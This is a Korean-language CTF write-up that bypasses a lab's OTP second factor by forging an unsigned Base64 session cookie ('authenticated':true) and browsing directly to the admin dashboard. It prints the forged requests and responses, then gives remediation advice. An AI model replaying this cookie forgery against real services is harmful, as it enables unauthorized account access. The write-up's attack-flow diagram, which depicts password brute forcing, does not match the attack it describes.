+++
title = "VulnABLE CTF [LUXORA] Write-up: Brute Force 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Brute Force", "Gold", "2FA Bypass", "Logic Flaw", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Brute Force 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Brute Force)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/brute/gold`
- **목표**: 아이디와 비밀번호를 맞추더라도 2차 인증(OTP)이 요구되는 환경에서, 인증 단계(State) 관리의 논리적 결함을 악용하여 OTP 검증을 우회하고 최종 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 플로우 분석 (Reconnaissance)

`/brute/gold` 에 접속하여 Silver 단계에서 획득한 `testadmin` / `password2024` 로 로그인을 시도합니다.

**[서버 응답 확인]**
```html
<div class="alert warning">
  <p>Authentication step 1 complete. Please enter your 6-digit OTP code to continue.</p>
</div>
<form action="/brute/gold/verify-otp" method="POST">
  <input type="text" name="otp" placeholder="000000">
  <button type="submit">Verify</button>
</form>
```

**[해커의 사고 과정]**
1. 1차 인증(ID/PW)은 성공했지만, 2차 인증(6자리 OTP)이 기다리고 있다.
2. 6자리 숫자는 000000부터 999999까지 총 100만 개다. 여기에 브루트포스를 시도해볼까?
3. (테스트 결과) 5번 틀리면 세션이 파기되고 다시 1차 로그인부터 시작해야 한다. 100만 번의 OTP 브루트포스는 불가능하다.
4. **그렇다면, 이 '2단계 인증 구조' 자체에 결함(Logic Flaw)이 있지 않을까?** 웹 서버는 내가 1차 로그인을 성공했다는 사실을 어떻게 기억하고 있을까?

---

## 💥 2. 취약점 식별 및 로직 분석 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Brute Force / FFuF)--> [ Web Server ]
             |-- Pwd1                  |-- Invalid
             |-- Pwd2                  |-- Invalid
             |-- ...                   |-- ...
             |-- CorrectPwd            |-- Access Granted!
```


Burp Suite의 Proxy 탭을 열어 1차 로그인 성공 시 서버가 어떤 정보를 쿠키로 내려주었는지 확인합니다.

### 패킷 분석 (Set-Cookie 확인)
```http
HTTP/1.1 200 OK
Set-Cookie: session_id=eyJ1c2VybmFtZSI6InRlc3RhZG1pbiIsImF1dGhlbnRpY2F0ZWQiOmZhbHNlfQ==; HttpOnly
```

쿠키 값이 Base64 인코딩되어 있습니다. 디코딩해 봅니다.
```text
{"username":"testadmin","authenticated":false}
```

이 쿠키를 가지고 `/brute/gold/verify-otp` 로 가서 임의의 OTP(123456)를 전송해 보았습니다.
```http
POST /brute/gold/verify-otp
Cookie: session_id=eyJ1c2VybmFtZSI6InRlc3RhZG1pbiIsImF1dGhlbnRpY2F0ZWQiOmZhbHNlfQ==

otp=123456
```
➔ 서버 응답: `Invalid OTP.`

**[취약점 도출]**
서버는 사용자의 로그인 완료 여부를 세션 DB(Redis 등)에 저장하지 않고, **클라이언트의 쿠키 데이터(`"authenticated":false`)를 전적으로 신뢰**하여 판단하고 있습니다. 게다가 이 쿠키에는 무결성을 검증할 서명(Signature)이나 암호화가 전혀 적용되어 있지 않습니다!

---

## 🚀 3. 인증 상태 조작 및 익스플로잇 (Exploitation)

우리는 OTP를 뚫을 필요가 없습니다. 그냥 서버에게 "나 이미 OTP 인증 성공했어!" 라고 조작된 쿠키를 보내면 됩니다.

### 쿠키 데이터 변조 (Tampering)
1. JSON 데이터 조작
   `{"username":"testadmin","authenticated":true}` (false를 true로 변경)
2. Base64 인코딩
   `eyJ1c2VybmFtZSI6InRlc3RhZG1pbiIsImF1dGhlbnRpY2F0ZWQiOnRydWV9`

### 관리자 페이지 직접 접근 (Forced Browsing)
이제 OTP 검증 페이지(`/brute/gold/verify-otp`)를 거치지 않고, 조작된 쿠키를 달고 최종 목적지인 관리자 대시보드(`/brute/gold/dashboard`)로 바로 직행합니다.

```http
GET /brute/gold/dashboard HTTP/1.1
Host: localhost:3000
Cookie: session_id=eyJ1c2VybmFtZSI6InRlc3RhZG1pbiIsImF1dGhlbnRpY2F0ZWQiOnRydWV9
```

### 🔍 서버의 응답
서버는 쿠키를 Base64 디코딩한 후, `"authenticated": true` 임을 확인하고 아무 의심 없이 대시보드 화면을 렌더링해 줍니다.

```html
<h1>Admin Dashboard</h1>
<div class="secret">
  <p>Welcome back, Administrator.</p>
  <p>FLAG{BRUTE_🥇_LOGIC_BYPASS_A1B2C3}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

강력해 보이는 2FA(다중 인증) 시스템조차도, 그 시스템을 지탱하는 상태 관리(State Management) 로직이 클라이언트 측 데이터에 의존하여 조작 가능하다면 무용지물이 됨을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{BRUTE_🥇_LOGIC_BYPASS_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 시나리오는 대표적인 **Insecure Direct Object Reference (IDOR)** 및 **Broken Access Control**의 형태를 띤 인증 우회입니다.

* **안전한 패치 가이드**
1. **서버 사이드 세션 저장소 사용**: 사용자 상태(인증 여부, 권한 등)는 절대로 쿠키의 평문으로 클라이언트에 넘기면 안 됩니다. `express-session` 같은 라이브러리를 사용하여 난수화된 세션 ID만 발급하고, 실제 상태는 서버 메모리나 Redis에 저장해야 합니다.
2. **상태 서명 (Signed Cookies)**: 어쩔 수 없이 클라이언트에 상태를 저장해야 한다면 JWT나 서명된 쿠키(Signed Cookies)를 사용하여 서버의 비밀키 없이는 데이터를 조작할 수 없게 만들어야 합니다.
3. **엄격한 라우트 보호**: 대시보드에 접근할 때, 단순히 쿠키의 Boolean 값만 보지 말고, OTP 검증이 완료된 세션인지 서버 DB를 통해 이중 검증해야 합니다.